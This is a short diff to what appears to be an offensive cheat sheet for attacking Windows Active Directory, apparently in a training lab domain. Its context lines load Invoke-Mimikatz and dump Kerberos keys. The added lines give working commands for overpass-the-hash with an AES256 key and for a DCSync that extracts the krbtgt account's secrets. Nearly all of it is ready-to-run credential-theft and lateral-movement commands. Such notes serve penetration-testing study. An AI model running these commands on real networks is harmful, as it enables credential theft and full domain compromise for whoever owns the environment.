@@ -83,3 +83,13 @@ C:> . .\Invoke-Mimikatz.ps1
 ```powershell
 C:> Invoke-Mimikatz -Command '"sekurlsa::ekeys"'
 ```
+- **OverPass the Hash (OPTH)**
+```powershell
+# Starts Powershell with logon type 9
+C:> Invoke-Mimikatz -Command '"sekurlsa::pth /user:<username> /domain:us.techcorp.local /aes256:<user_aes256key> /run:powershell.exe"'
+```
+- **DCSync**
+```powershell
+# Domain Admin privileges required to run DCSync
+C:> Invoke-Mimikatz -Command '"lsadump::dcsync /user:<domain>\krbtgt"'
+```
